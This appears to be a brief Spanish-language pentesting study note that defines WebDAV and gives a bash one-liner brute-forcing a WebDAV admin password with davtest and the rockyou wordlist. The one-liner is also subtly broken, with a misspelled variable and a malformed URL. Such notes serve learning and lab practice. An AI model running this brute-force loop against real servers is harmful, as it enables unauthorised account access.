___
- tags: #owasp #webdav
___
## Web Distributed Authoring and Versioning - WebDAV
Es una extensión del protocolo HTTP que permite a los usuarios **acceder** y **manipular archivos** de un servidor web a través de una conexión segura.

### OneLiner
```shell
cat /usr/share/wordlists/rockyou.txt | while read password; do respone=$(davtest -url http:127.0.0.1 -auth admin:$password 2>&1 | grep -i succeed); if [ $response ]; then echo "[+] La contraseña correcta es $password"; break; fi; done
```
